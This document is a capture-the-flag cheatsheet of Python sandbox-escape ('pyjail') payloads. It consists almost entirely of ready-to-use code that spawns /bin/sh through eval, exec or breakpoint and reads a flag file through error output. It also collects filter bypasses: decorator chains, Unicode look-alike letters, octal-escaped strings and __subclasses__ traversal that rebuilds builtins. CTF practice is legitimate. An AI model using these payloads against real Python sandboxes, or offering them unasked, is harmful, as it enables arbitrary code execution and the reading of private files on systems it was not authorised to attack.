# Pyjail cheatsheet

## Common payloads

### no builtins, inside an interactive shell

```py
del __builtins__
exec(input())
```

### Spawning a shell

```py
breakpoint()
# import os; os.system("/bin/sh")
```
```py
exec(input())
# import os; os.system("/bin/sh")
```
```py
eval(input())
# __import__("os").system("/bin/sh")
```

### Read a file

```py
# to stderr
exit(set(open("flag")))
exit(*open("flag"))
help(*open("flag")) # this only works if stdout is closed
open(*open("flag"))
compile(".","flag","exec") # flag printed to stderr
ast.parse(".", "flag") # only works if ast is imported
```

```py
# to stdout
help(*open("flag")) # this works like a normal print
set(open("flag")) # only works inside an interactive console
print(*open("flag"))
```

### Deleting a variable

```py
# Using try except:

delete_me = ""
try:
    p
except NameError as delete_me:
    pass
print(delete_me) # error
```
```py
# using del

delete_me = ""
del delete_me
print(delete_me) # error
```

## Bypassing common blacklists
### No function calls

```py
@exec
@input
def a:pass # or class a:pass
```

### No function call and no exec/eval

```py
@print
@set
@open
@input
def a:pass # or class a:pass
```

### No function call, no exec/eval, no \n, no spaces, no tabs
```py
@print\r@set\r@open\r@input\rdef\x0ca:pass
```

### No ASCII letters
```py
# I usually use https://lingojam.com/ItalicTextGenerator

𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")

```

### no ASCII letters, no underscores, inside eval
```
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())

```

### no ASCII letters, no double underscores, no builtins, inside eval
```py
()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\157\163").𝘴𝘺𝘴𝘵𝘦𝘮("\57\142\151\156\57\163\150")
```

### no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
```py
[𝘺:=()._＿𝘥𝘰𝘤＿_, 𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]
```

### no builtins, no mro, no strings, multiple exec
```py
# first exec
__builtins__ = ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__

# second exec
exec(input())
```

### no builtins, no mro, single exec
```py
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```
